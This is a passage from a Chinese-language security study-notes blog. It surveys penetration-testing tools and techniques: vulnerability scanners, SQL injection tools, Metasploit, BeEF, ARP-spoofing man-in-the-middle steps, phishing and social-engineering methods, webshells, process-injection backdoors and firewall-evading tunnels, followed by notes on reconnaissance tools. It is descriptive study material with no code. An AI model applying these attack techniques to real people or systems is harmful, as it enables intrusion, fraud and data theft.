+<p>处理端口扫描外，Nmap还具备以下功能：</p>
+<ul>
+<li>主机探测</li>
+<li>服务/版本识别</li>
+<li>操作系统检测</li>
+<li>网络路由跟踪</li>
+<li>Nmap脚本引擎</li>
+</ul>
+<h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><h3 id="Amap"><a href="#Amap" class="headerlink" title="Amap"></a>Amap</h3><p>Amap程序可以监测在指定端口上运行的应用程序信息。Amap向目标端口发送检测数据，在收到目标响应之后，将响应信息与数据库中结果进行匹配，并显示出匹配的应用程序。</p>
+<h2 id="收集服务漏洞"><a href="#收集服务漏洞" class="headerlink" title="收集服务漏洞"></a>收集服务漏洞</h2><h3 id="DirBuster-查看目录结构"><a href="#DirBuster-查看目录结构" class="headerlink" title="DirBuster:查看目录结构"></a>DirBuster:查看目录结构</h3><p>目录和文件信息收集工具（Crawling Tool）DirBuster是多线程Java应用程序，它以暴力破解的方式检测出隐藏于网络和应用程序的文件和目录，并以此找出攻击因子（factor）。另外，它还可以设置暴力破解的起始位置，其起始位置可以是顶端目录，也可以是特定目录的子目录。</p>
+<h3 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h3><p>Nessus是安全漏洞自动收集工具，它可同时远程或在主机上进行测试，扫描各种开发端口的服务器漏洞，并编写报告，报告中包括了CVE漏洞基准的漏洞说明和应对方案，导出问题时可做参考。</p>
+<h3 id="Openvas"><a href="#Openvas" class="headerlink" title="Openvas"></a>Openvas</h3><p>Openvas是一款封装了多种安全工具和安全服务的软件，是一个强大的漏洞管理平台。它采用了客户端/服务器的框架。其客户端测试目标主机网络漏洞的一系列操作，都是通过服务器端程序实现的。他的设计兼备模块化和稳定性的特点，支持并行安全测试，且兼容多种操作系统。</p>
+<h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h3><p>Nikto是一款开源网页服务器，能够扫描应用程序漏洞。在应用程序漏洞自动化扫描工具中，这款还是非常不错的。</p>
+<h2 id="诊断CMS服务漏洞"><a href="#诊断CMS服务漏洞" class="headerlink" title="诊断CMS服务漏洞"></a>诊断CMS服务漏洞</h2><h3 id="Joomscan"><a href="#Joomscan" class="headerlink" title="Joomscan"></a>Joomscan</h3><p>jomscan是基于签名的扫描器，它以开源的CMS服务joomal的Sql注入、命令执行、XSS对象，试试joomla目录搜索和漏洞检测。Joomla适合电子商务、网上购物、论坛等各类网站，是使用较为普遍的CMS。网站使用的是众所周知的漏洞——数据库。joomscan具有构成要素、插件、组件、外观等4个基本扩展名。</p>
+<h3 id="WPScan"><a href="#WPScan" class="headerlink" title="WPScan"></a>WPScan</h3><p>WPScan是WordPress Scan的缩写，它是使用php语言开发而成的公开博客服务。最近介绍WordPress的书很多，这已经证明它在韩国国内也是用户群众比较广泛的代表性开源平台。</p>
+<h3 id="WhatWeb"><a href="#WhatWeb" class="headerlink" title="WhatWeb"></a>WhatWeb</h3><p>WhatWeb是Web系统识别工具，它可以识别CMS、博客平台、统计和分析数据包、JavaScript库、网络服务器和嵌入式装备等网络技术。WhatWeb中包含可以识别各种技术的1000多个插件。另外，它还会查看版本编号、邮箱地址、账户ID、网络框架组件、SQL错误等。</p>
+<h2 id="诊断数据库漏洞"><a href="#诊断数据库漏洞" class="headerlink" title="诊断数据库漏洞"></a>诊断数据库漏洞</h2><h3 id="SQLmap"><a href="#SQLmap" class="headerlink" title="SQLmap"></a>SQLmap</h3><p>sqlmap是一款开源的渗透测试工具，它可以自动搜索SQL注入漏洞，并自动化攻击数据库服务器。这款功能超强的搜索检测引擎可以从数据库的Fingerprinting（获取信息）向数据库输出数据、访问文件系统、访问频段外区域以执行OS上的命令等。为实施最理想的渗透测试提供了多种便利功能和诸多选项开关。</p>
+<h3 id="sqlsus"><a href="#sqlsus" class="headerlink" title="sqlsus"></a>sqlsus</h3><p>Sqlsus是基于Perl编写的开源MySQL注入接管（takeover）工具。Sqlsus可通过命令行界面进行数据库结构搜素、数据库复制、sql查询插入、从网络服务器下载文件、网站抓取等等操作。另外sqlsus还提供了MySQL控制台功能，而且能够优质高效、最大限度地发挥MySQL功能。</p>
+<h2 id="诊断认证通信"><a href="#诊断认证通信" class="headerlink" title="诊断认证通信"></a>诊断认证通信</h2><h3 id="SSLScan-查看通信是否已经加密"><a href="#SSLScan-查看通信是否已经加密" class="headerlink" title="SSLScan:查看通信是否已经加密"></a>SSLScan:查看通信是否已经加密</h3><p>SSLScan能查看SSL服务的使用状态，如正在使用，则能便捷地获取相关内容。SSLScan向SSL服务发送查询语句，分析答复后发送给用户。向服务器传递重要数据时，通信必须是加密的，因此，诊断网络应用程序时必须判断是否实际实施SSL通信。</p>
+<h3 id="digicert-查看是否已使用SSL认证证书"><a href="#digicert-查看是否已使用SSL认证证书" class="headerlink" title="digicert:查看是否已使用SSL认证证书"></a>digicert:查看是否已使用SSL认证证书</h3><p>digicert服务并不是安装在Kali linux中的工具，而是提供SSL认证的服务。通过访问网站查看SSL认证书安装状态以及结束日期等信息。其速度快而准确，可在不定期检测时使用。</p>
+<h1 id="深化攻击工具"><a href="#深化攻击工具" class="headerlink" title="深化攻击工具"></a>深化攻击工具</h1><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>Msf（Metasploit Framework）开源工具是提供攻击代码、有效负载、编码器、侦查工具、安全测试等等的一种平台架构。MSF最初版本不过是攻击代码的集合而已，而当前版本已具有大范围信息收集、攻击等相关安全工具的设计和开发能力。</p>
+<h3 id="Exploit-DB"><a href="#Exploit-DB" class="headerlink" title="Exploit-DB"></a><strong>Exploit-DB</strong></h3><p><strong><a href="https://www.exploit-db.com/" target="_blank" rel="noopener">Exploit-DB</a></strong>其中包含了近期的漏洞信息，是一个庞大的漏洞信息库。这里面包含了远程代码执行、Web 应用程序漏洞、本地提权等漏洞信息.</p>
+<h2 id="服务器端工具"><a href="#服务器端工具" class="headerlink" title="服务器端工具"></a>服务器端工具</h2><h3 id="Metasploit-1"><a href="#Metasploit-1" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>Metasploit框架是进行服务器端攻击时一种最流行的功能工具，它也被认为是对渗透测试人员最有利的工具之一。介绍Metasploit的使用的部分在我的Metasploit系列学习中有详细的介绍，我在此处就不再过多的讲解了。</p>
+<h3 id="W3af"><a href="#W3af" class="headerlink" title="W3af"></a>W3af</h3><p>w3af是Web Application Attack and Audit Framework（Web应用攻击和安全审计框架）的缩写。它是一个开源的Web应用安全扫描器和漏洞利用工具。</p>
+<h3 id="Skipfish"><a href="#Skipfish" class="headerlink" title="Skipfish"></a>Skipfish</h3><p>Skipfish是一款Web应用安全侦查工具。Skipfish会利用递归爬虫和基于字典的探针生成一副交互式网站地图。最终生成的地图会在通过安全检查后输出。</p>
+<h3 id="ProxyStrike"><a href="#ProxyStrike" class="headerlink" title="ProxyStrike"></a>ProxyStrike</h3><p>Proxystrike是一个Web应用代理，用来浏览应用时找出漏洞。它的运行机制跟代理类似，默认监听端口是8008端口，也就是说，你要对浏览器进行设置，使其运行时经过ProxyStrike。这样它才能在你的浏览目标网站时在后台分析所有参数。代理功能非常适合用来识别、拦截和修改请求的内容。</p>
+<h3 id="Vega"><a href="#Vega" class="headerlink" title="Vega"></a>Vega</h3><p>vega是一个安全测试工具，用来爬取一个网站，并分析页面内容来找到链接和表单参数。</p>
+<h3 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP ZAP"></a>OWASP ZAP</h3><p>OWASP ZAP也称为Zaproxy，是一个专门为Web应用的安全测试而设计的拦截代理。</p>
+<h3 id="WebSploit"><a href="#WebSploit" class="headerlink" title="WebSploit"></a>WebSploit</h3><p>WebSploit是一个用来扫描和分析远程系统以找到漏洞的开源项目</p>
+<ul>
+<li><p><strong>服务器漏洞利用</strong></p>
+</li>
+<li><p><strong>利用电子邮件系统的漏洞</strong></p>
+</li>
+<li><strong>暴力破解攻击</strong></li>
+<li><strong>破解密码</strong></li>
+<li><strong>中间人攻击</strong></li>
+</ul>
+<h2 id="客户端攻击"><a href="#客户端攻击" class="headerlink" title="客户端攻击"></a>客户端攻击</h2><h3 id="社会工程"><a href="#社会工程" class="headerlink" title="社会工程"></a>社会工程</h3><h3 id="获取和破解用户密码"><a href="#获取和破解用户密码" class="headerlink" title="获取和破解用户密码"></a>获取和破解用户密码</h3><p>黑客破解密码的方式有：</p>
+<ul>
+<li>猜测：通常使用收集到的与目标有关的信息进行人工猜测</li>
+<li>字典攻击：使用自动化攻击，利用字典中所有可能的单词进行尝试</li>
+<li>暴力破解：使用所有可能的字符组合来破解</li>
+<li>混合模式：混合使用字典攻击和暴力破解</li>
+</ul>
+<h2 id="Web攻击"><a href="#Web攻击" class="headerlink" title="Web攻击"></a>Web攻击</h2><h3 id="浏览器漏洞利用框架：BeEF"><a href="#浏览器漏洞利用框架：BeEF" class="headerlink" title="浏览器漏洞利用框架：BeEF"></a>浏览器漏洞利用框架：BeEF</h3><p>Beef是一个基于浏览器的漏洞利用包，它会“勾住”一个或多个浏览器作为发起攻击的滩头堡。攻击者可以通过让用户访问一个定制的URL来勾住用户，用户看到的依然是典型的web页面，而攻击者已经访问了用户的会话Beef绕过了网络安全部署和基于主机系统的反病毒程序，它瞄准的是常见的浏览器中找到的漏洞，比如IE和Firefox浏览器。</p>
+<h3 id="FoxyProxy（fireFox插件）"><a href="#FoxyProxy（fireFox插件）" class="headerlink" title="FoxyProxy（fireFox插件）"></a>FoxyProxy（fireFox插件）</h3><p>FoxyProxy是一款FierFox扩展，它允许你轻松的管理、修改、启用或禁用Firefox上的代理设置。你可以存Fierfox扩展库中下载FoxyProxy。</p>
+<h3 id="Burp代理"><a href="#Burp代理" class="headerlink" title="Burp代理"></a>Burp代理</h3><p>Burp代理是一款拦截HTTP和HTTPS浏览的工具，它允许渗透测试人员检查某一个应用、它的漏洞以及客户端和Web服务器之间的双向数据流。Burp代理非常流行，因为它不止能用来检查数据流，还可以用来篡改数据。</p>
+<h3 id="OWASP-ZAP-1"><a href="#OWASP-ZAP-1" class="headerlink" title="OWASP ZAP"></a>OWASP ZAP</h3><h3 id="Fimap"><a href="#Fimap" class="headerlink" title="Fimap"></a>Fimap</h3><p>Fimap是一款python工具，用于自动查找、准备、审计、利用和用谷歌搜索Web应用中的<strong>本地和远程文件包含Bug</strong></p>
+<h3 id="DNSChef"><a href="#DNSChef" class="headerlink" title="DNSChef"></a>DNSChef</h3><p>DNSChef是一款为渗透测试人员和恶意软件分析人员准备的DNS代理。DNS代理也被称作“伪造DNS”，是一款用于应用网络流量分析以及其他场景的工具。</p>
+<h3 id="Siege"><a href="#Siege" class="headerlink" title="Siege"></a>Siege</h3><p>Siege是一款为Web开发人员设计的HTTP/HTTPS压力测试工具，用来测量高压情况下他们代码的性能。Siege提供了多线程HTTP负载测试和基准测试功能，他会根据可配置的兵法和模范用户的数据来对Web服务器进行测试。Siege有回归、英特网仿真和暴力等工作方式。</p>
+<h2 id="身份认证攻击"><a href="#身份认证攻击" class="headerlink" title="身份认证攻击"></a>身份认证攻击</h2><h3 id="攻击会话管理"><a href="#攻击会话管理" class="headerlink" title="攻击会话管理"></a>攻击会话管理</h3><h3 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h3><h3 id="劫持Web会话的CooKie"><a href="#劫持Web会话的CooKie" class="headerlink" title="劫持Web会话的CooKie"></a>劫持Web会话的CooKie</h3><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p><strong>dsniff和arpspoof</strong><br>dsniff是一组密码嗅探和网络数据分析工具，用于解析不同的应用协议和提取相关信息。arpspoof用于帮助攻击者向本地网络发送伪造的地址解析协议（ARP）消息。这样做的目的就是要将攻击者的MAC地址和其他主机的IP地址关联起来，从而将发往该IP地址的网络数据都发送给攻击值。</p>
+<p>一个人进行中间人攻击的方法是将Arpspoof和dsniff用在系统间。</p>
+<p>第一步就是找出受害者的IP地址和网络的默认网关。找出IP地址之后，你需要告诉受害者你真的是另一个系统或者默认网关。举个例子，如果受害者A的IP地址是192.168.11.4，默认网关的地址为192.168.11.1，攻击者的地址为192.168.11.145，你应该使用arpspoof命令将你那个145的ip地址设置的看起来像是受害者的和默认网关的。</p>
+<p><strong>Ettercap</strong></p>
+<p>Ettercap是一个用于基于中间人方式的攻击的免费的开源综合工具套件。</p>
+<p>Ettercap可用于计算机网络协议分析和安全审计，它的功能有嗅探活动的链接、内容过滤、以及对多种协议的主动和被动解析的支持。Ettercap通过将攻击者的网卡设置为昏则模式以及对受害者的机器进行ARP污染来工作。</p>
+<h2 id="社会工程学攻击"><a href="#社会工程学攻击" class="headerlink" title="社会工程学攻击"></a>社会工程学攻击</h2><h3 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h3><p>社会工程学工程师通常会采用这些方法来有效获取目标的有关信息和访问权限：</p>
+<p><strong>（1）情报收集：</strong>多种技术都可以用于找到最容易攻破的渗透测试目标。例如，我们可以采用高级搜索工具收集被测试公司员工的Email地址；通过社交网络收集被测单位员工的个人信息；识别被测单位组织使用的第三方软件包；参与他们的经营活动、社交活动和参加会议等等。以这些方提供的情报，能够准确的退测出社会工程学意义上的“线人”。</p>
+<p><strong>（2）识别漏洞：</strong>一旦选定了关键线人，接下来就开始与对方建立信任关系和友谊。这样就可以在不伤害、不惊动目标的情况下，截获被测单位的机密信息。保持行动的隐蔽性和保密性，对于整个过程来说至关重要。另外，也可以调查被侧单位是否使用了旧版软件，继而通过恶意的E-mail或 Web内容，利用软件漏洞感染当事人的计算机。</p>
+<p><strong>（3）规划攻击:</strong>  你可以对目标采取直接了当的攻击方式，也可以利用电子辅助技术被动攻击目标。以这些挖掘出来的情报入口着手，我们恶意轻松的拟定攻击路径和攻击方法。例如：被测单位的客户服务代表Bob和我们的关系很好，他还信任我们；他就恒友可能在计算机上执行我们发送的E-mail附件，这种攻击不需要高级管理人员的任何事前授权。</p>
+<p><strong>（4）执行攻击：</strong>社会工程学攻击的最后一步是执行攻击计划。此时，我们应该保持足够的信心和耐心，主动监控和评估工作的成果。完成这一步之后，社会工程师掌握了充分的信息，甚至可以范围被测单位的内部系统，这些成果足以让他们进一步地渗透被测试的单位。在成功执行攻击计划之后，社会工程学的攻击就可宣告结束。</p>
+<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p><strong>（1）冒名顶替</strong></p>
+<p>攻击人员常常假装成他人以获得对方的信任。例如，在获取目标人员的银行信息方面，只要目标人员是哟E-mail，我们就可以进行钓鱼攻击。这种攻击属于近乎完美的攻击方案。当决定使用钓鱼攻击之后，攻击人员要大量的收集牧宝人员用过的E-mail地址，然后伪造出于原银行解密一样的网页界面，以诱骗目标人员。</p>
+<p>完成了一上准备之后，攻击人员会草拟并发送一份正式行文的E-mail（例如：银行账户更新通知）。这些E-mail看上去就像真正的银行发出来的邮件。要去目标人员访问某网址更新账户信息。不过，邮件提到的网址将把目标人员提交的信息转发给攻击人员。攻击人员事先掌握了特定的Web技术，他们使用多种先进的工具（例如SSLstrip）就可以通过自动化手段轻松的又掉地到达预定的任务。</p>
+<p><strong>（2）投桃报李</strong></p>
+<p>通过利益交换的方式达成双方各自利益的行为，成为投桃报李。这类攻击需要长期业务合作达成的非正式关系。利用公司之间的信任关系，可以轻松的获取特定信息的目标人员。</p>
+<p><strong>（3）狐假虎威</strong></p>
+<p>冒充目标单位业务负责人的身份从而干预正常业务的做法就是狐假虎威。有些人认为，这种攻击方式属于冒名顶替的一种特例。人们会本能的出于下意识的接收权威或者高级管理人员的知识，这个时候他们会无视自己否定性的直觉。这种天性使我们容易在特定的威胁面前毫无抵抗力。</p>
+<p><strong>（4）啖以重利</strong></p>
+<p>人们常常说“机不可失”，他们特别关注所谓机不可失的宝贵机会。这些想法都是人性贪婪的一面写照。啖以重利的方法李永利人们个球谋利机会的贪婪心理。</p>
+<p><strong>（5）社会关系</strong></p>
+<p>作为人，我们需要某种形式的社会关系，以分享思想、感情、想法。社会关系最容易受攻击的部分是“性”。多数情况下，异性总是吸引。由于这种强烈的感情和信任的错觉，人们可能在不经意间向对手透露信息。很多线人的社交门户网站都提供了见面和聊天的服务，以促进用户间的社交交际。</p>
+<h3 id="Social-Engineering-Toolkit-SET"><a href="#Social-Engineering-Toolkit-SET" class="headerlink" title="Social Engineering Toolkit(SET)"></a>Social Engineering Toolkit(SET)</h3><p>SET是一款先进的多功能的社会工程学计算机辅助工具集。可以行之有效的用客户端应用程序的漏洞获取目标的信息（例如E-mail）.SET可以实现多种非常有效且使用的攻击方法。其中，人们最常用的方法有：用恶意附件对目标进行E-mail钓鱼攻击、Java Applet攻击、基于浏览器的漏洞攻击、收集网站认证信息、建立感染的便携媒体、邮件群发等攻击。它是实现这些攻击方法的合成攻击平台。充分利用这个程序的极具说服力的技术，可对人的因素进行深入测试。</p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><ul>
+<li>利用本地漏洞</li>
+<li>利用目标系统上的配置缺陷。例如，如何home目录可被其他用户访问，那么攻击人员就可以使用目录里的SSH私有密钥访问其他主机。</li>
+<li>利用目标系统的弱密码</li>
+<li>嗅探网络流量以捕获他人的用户密码</li>
+<li>伪造网络数据包</li>
+</ul>
+<p><strong>利用本地漏洞</strong></p>
+<p><strong>密码攻击</strong></p>
+<p><strong>社会工程学</strong></p>
+<h2 id="操作系统后门"><a href="#操作系统后门" class="headerlink" title="操作系统后门"></a>操作系统后门</h2><h3 id="Cymothoa"><a href="#Cymothoa" class="headerlink" title="Cymothoa"></a>Cymothoa</h3><p>Cymothoa是一款可以将ShellCode注入到现有进程（插入进程）的后门工具。借助这种注入手段，它能够把ShellCode伪装成常规程序。将ShellCode注入到其他进程，还有另外一个优势就是：即使目标系统的安全防护工具能够讲师可执行程序的完整性，只要它不检查内存，那么它就不能发现后门程序（插入进程）的进程。</p>
+<h3 id="Intersect"><a href="#Intersect" class="headerlink" title="Intersect"></a>Intersect</h3><p>Intersect是一款适合在漏洞利用以后使用的能够自动完成多种后期任务的程序。他能够自动收集密码文件、赋值SSH密钥、收集网络信息，并能识别杀毒软件和防火墙程序。</p>
+<h3 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h3><p>著名的Metasploit Meterpreter程序自带一个后门程序“metsvc”,它可以让你随时获取Meterpreter的shell</p>
+<h2 id="隧道工具"><a href="#隧道工具" class="headerlink" title="隧道工具"></a>隧道工具</h2><p><strong>隧道</strong></p>
+<p>在计算机领域里，隧道是指使用某个网络协议封装另外一种网络协议的技术手段。在渗透测试中，使用隧道技术主要是为了让目标胸膛呢的防护机制无法发挥作用。多数情况下，目标系统的防火墙会组织内部系统访问外网网络，只放行DNS\HTTP\HTTPS这类常见的网络协议。在这种情况下，如果要在目标系统的内网使用外网的其他网络协议，就需要构建HTTP协议的隧道。这样，防火墙就会放行隧道封装的数据。</p>
+<h3 id="dns2tcp"><a href="#dns2tcp" class="headerlink" title="dns2tcp"></a>dns2tcp</h3><p>dns2tcp是一种把TCP数据包伪装成DNS协议数据包的隧道封装工具。它适用于目标主机只能发送DNS请求的网络环境。当它在特定端口受理链接请求时，它会将数据封装为DNS协议格式，在发送到指定主机的指定端口的dns2tcp服务端程序。</p>
+<h3 id="ncat"><a href="#ncat" class="headerlink" title="ncat"></a>ncat</h3><p>ncat是一款集发送、接收、转发、加密数据等多种功能于一身的网络工具。ncat是著名的Netcat程序的改进版。它的功能有：</p>
+<ul>
+<li>它可以用作Web服务程序和其他TCP/IP服务器端程序简易TCP/UDP/SCTP/SSL客户端；</li>
+<li>它可以用作简单的TCP、UDP、SCTP、SSL服务器端程序。</li>
+<li>它可以转发或代理TCP、UDP、SCTP流量</li>
+<li>它可以用作执行系统指令的网络网关</li>
+<li>它可使用SSL技术加密通信数据</li>
+<li>它可以使用IPv4或IPV6技术进行网络传输</li>
+<li>它可用作连接代理，通过第三个中介服务器使用两个或多个客户端互联代理。</li>
+</ul>
+<h3 id="proxychains"><a href="#proxychains" class="headerlink" title="proxychains"></a>proxychains</h3><p>proxychains程序可以强制TCP客户端程序通过指定的代理服务器（或代理链）发起TCP链接。自从3.1版本开始，它支持SOCKS4代理、SOCKET5代理和基于CONNECT模式的HTTP代理服务器。</p>
+<h3 id="ptunnel"><a href="#ptunnel" class="headerlink" title="ptunnel"></a>ptunnel</h3><p>ptunnel是一款使用ICMP ping（请求和回复）封装TCP链接的隧道工具。即使被测主机无法向Internet发送任何TCP和UDP的数据，只要它可以向取Internet发起ping命令，那么这款工具就可以帮助它穿越防火墙。ptunnel可以脱离TCP和UDP链接访问E-mail、上网或者进行其他网络活动。</p>
+<h2 id="Web后门"><a href="#Web后门" class="headerlink" title="Web后门"></a>Web后门</h2><h3 id="WeBaCoo"><a href="#WeBaCoo" class="headerlink" title="WeBaCoo"></a>WeBaCoo</h3><p>WeBaCoo（Web Backdoor Cookie）是一款隐蔽的脚本类Web后门工具。借助HTTP协议，它可以在客户端和服务器端实现执行代码的网页终端。</p>
+<h3 id="Weevely"><a href="#Weevely" class="headerlink" title="Weevely"></a>Weevely</h3><p>Weevely是一款具有高隐蔽性的针对PHP平台的WEBShell。它实现了SSH风格的终端界面，并有大量自动化的模块。测试人员可用它来执行系统命令、远程管理和渗透后期的自动渗透界面。</p>
+<h3 id="PHP-Meterpreter"><a href="#PHP-Meterpreter" class="headerlink" title="PHP Meterpreter"></a>PHP Meterpreter</h3><p>Metasploit有一个名为PHP Meterpreter的payload。这个模块可以创建具有Meterpreter功能的PHP webShell。利用目标的漏洞（诸如常见的注入、文件上传漏洞）之后，再把它的shell传到目标主机即可。</p>
+<h2 id="以网络为测试目标的渗透测试报告（样文）"><a href="#以网络为测试目标的渗透测试报告（样文）" class="headerlink" title="以网络为测试目标的渗透测试报告（样文）"></a>以网络为测试目标的渗透测试报告（样文）</h2><ul>
+<li>法律声明</li>
+<li>渗透测试协议</li>
+<li>简介</li>
+<li>项目目标</li>
+<li>假定和限制</li>
+<li>漏洞和影响</li>
+<li>执行摘要</li>
+<li>风险矩阵</li>
+<li>测试方法</li>
+<li>安全威胁</li>
+<li>改进建议</li>
+<li>漏洞映射</li>
+<li>利用方法</li>
+<li>合规性评估</li>
+<li>变更管理</li>
+<li>最佳实践</li>
+<li>附录</li>
+</ul>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href="javascript:void(0)" class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+  
+  <div class="categories">
+    <a href="/categories/安全/">安全</a>, <a href="/categories/安全/笔记/">笔记</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/笔记/">笔记</a>, <a href="/tags/安全/">安全</a>
+  </div>
+
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2020-01-14T08:56:12.000Z"><a href="/2020/01/14/20200114/">2020-01-14</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2020/01/14/20200114/">2020年1月14日学习笔记</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="路由收集"><a href="#路由收集" class="headerlink" title="路由收集"></a>路由收集</h2><h3 id="traceroute"><a href="#traceroute" class="headerlink" title="traceroute"></a>traceroute</h3><p>通过traceroute我们可以知道信息从你的计算机到互联网另外一端的主机是走什么路径。当然每次数据包由某一同一的出发点（source）到达某一同一的目的地（destination）走的路径可能会不一样，但基本上来说大部分时候所走的路由是相同的。Linux中，我们称之为traceroute，在MS Windows中我们称之为tracert。</p>
+<h3 id="tctrace"><a href="#tctrace" class="headerlink" title="tctrace"></a>tctrace</h3><p>tctrace也是一个路由信息分析工具，这个程序通过向目标主机发送TCP/SYN数据包来获取相应的信息。</p>
+<h2 id="DNS信息收集"><a href="#DNS信息收集" class="headerlink" title="DNS信息收集"></a>DNS信息收集</h2><h3 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h3><p>Whois简单来说就是一个用来查询域名是否已经被注册，以及注册域名的纤细信息的数据库（如域名所有人、域名注册商、域名注册日期、过期日期等）.</p>
+<h3 id="Dig"><a href="#Dig" class="headerlink" title="Dig"></a>Dig</h3><p>dig（域信息搜索器）命令是一个用于询问 DNS 域名服务器的灵活的工具。它执行 DNS 搜索，显示从受请求的域名服务器返回的答复。多数 DNS 管理员利用 dig 作为 DNS 问题的故障诊断，因为它灵活性好、易用、输出清晰。</p>
+<h3 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h3><p>Host指令提供一个简单的DNS解析的功能。正常地使用名称到IP的解析，当指令没有任何参数和选项的时候，它将输出简单的带命令行参数和选项的概要。</p>
+<h3 id="Fierce"><a href="#Fierce" class="headerlink" title="Fierce"></a>Fierce</h3><p>在一个安全的环境中，暴力破解DNS的方式是一种获取不连续IP地址空间主机的有效手段。fierce工具可以满足这样的需求，而且已经预装在Kali Linux中。fierce是RSnake创立的快速有效地DNS暴力破解工具。fierce工具首先根据域名的IP地址，查询相关的域名服务器，然后利用字典进行攻击</p>
+<h3 id="dnsenum"><a href="#dnsenum" class="headerlink" title="dnsenum"></a>dnsenum</h3><p>dnsenum的目的是尽一切可能收集一个域的信息，它能够通过Google或者字典文件猜测可能存在的域名，以及对一个网段进行反查询。</p>
+<p>它可以查询网站主机的主机地址信息、域名服务器、MX record（函数交换记录），在域名服务器上执行axfr请求，并通过Google脚本得到扩展域名信息，提取子域名并且查询，计算C类地址并执行Whois查询，执行反向查询，把地址段写入文件。</p>
+<h3 id="lbd"><a href="#lbd" class="headerlink" title="lbd"></a>lbd</h3><p>lbd(Load balancing detector,负载平衡检测器)检测给定的域是否使用DNS/HTTP负载均衡（通过Server和DateHTTP响应头字段和服务器应答之间的差异）</p>
+<h2 id="IDS-IPS信息收集"><a href="#IDS-IPS信息收集" class="headerlink" title="IDS/IPS信息收集"></a>IDS/IPS信息收集</h2><h3 id="IDS-IPS简介"><a href="#IDS-IPS简介" class="headerlink" title="IDS/IPS简介"></a>IDS/IPS简介</h3><p>IDS（Intrusion Detection System）即入侵检测系统。是一种对网络传输进行及时监控，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备。它与其他网络安全设备的不同之处便在于——IDS是一种积极主动的安全防护技术。</p>
+<p>IPS（Intrusion Prevention System）即入侵防御系统。IPS位于防火墙和网络设备之间。这样，如过检测到攻击，IPS会在这种攻击扩散到网络的其他地方之前阻止这个恶意的通信。</p>
+<h3 id="IDS-IPS二者的区别"><a href="#IDS-IPS二者的区别" class="headerlink" title="IDS/IPS二者的区别"></a>IDS/IPS二者的区别</h3><p>（1）IDS注重的是网络安全状况的监管。IPS注重的是对入侵行为的控制。</p>
+<p>（2）IDS需要部署在网络内部的中心点，需要能够观察到所有网络数据。IPS需要部署在网络的边界。</p>
+<p>（3）IDS的核心价值在于通过对全网信息的分析，了解信息系统的安全状况，进而指导信息系统安全建设目标以及安全策略的确立和调整，而IPS系统的核心价值在于安全策略的实施————————对黑客行为的阻击。</p>
+<p>（4）IDS需要部署在网络内部，监控范围可以覆盖整个子网，包括来自外部的数据以及内部终端之间传输的数据，IPS则必须部署在网络边界，抵御来自外部的入侵，对内部攻击行为无能为力。</p>
+<p><strong>WAFw00f</strong>是Python脚本，用于检测网络服务器是否处于网络应用的防火墙（WAF ，Web application firewall）保护状态。不仅可以发展测试战略，而且能够开发绕过应用网络防火墙的高级技术。</p>
+<h2 id="存活主机识别"><a href="#存活主机识别" class="headerlink" title="存活主机识别"></a>存活主机识别</h2><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>在检测主机是否在线的工具中，ping可能是最著名的程序了。该工具向目标主机发送ICMP协议的echo request数据包。如果目标主机在线且允许受理ping请求，那么目标主机间回复ICMP echo reply数据包。</p>
+<h3 id="arping"><a href="#arping" class="headerlink" title="arping"></a>arping</h3><p>arping是在局域网中使用ARP(Address Resolution Protocol)请求判断目标主机是否在线的工具。您可以用IP地址或MAC地址作为它的测试目标。</p>
+<p>因为arping程序工作于OSI模型中的第二层，ARP协议的数据包无法通过路由器和网关，所以它只能检测本地局域网中的主机。</p>
+<h3 id="fping"><a href="#fping" class="headerlink" title="fping"></a>fping</h3><p>与ping程序相比，fping可以同时向多个主机发送ping（ICMP echo）请求。您可以在命令行中指定多个目标主机，也可以在某个文件里指定需要被测试的主机。</p>
+<p>默认模式下，fping程序通过目标主机的回复来判断该主机是否在线。如果目标主机发送了回应，该主机将会被标记为alive（在线）；如果主机在一段时间内（超时或者超过尝试次数）没有进行响应，该主机则会被标记为UNreachable（不可访问）。默认情况下，fping将尝试向每个目标发送三次ICMP echo数据包。</p>
+<h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h3><p>hping是用于生成和解析TCP/IP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。</p>
+<p><strong>hping3的主要用途：</strong></p>
+<ul>
+<li>测试防火墙规则</li>
+<li>测试入侵检测系统IDS</li>
+<li>测试TCP/IP模式的安全漏洞</li>
+</ul>
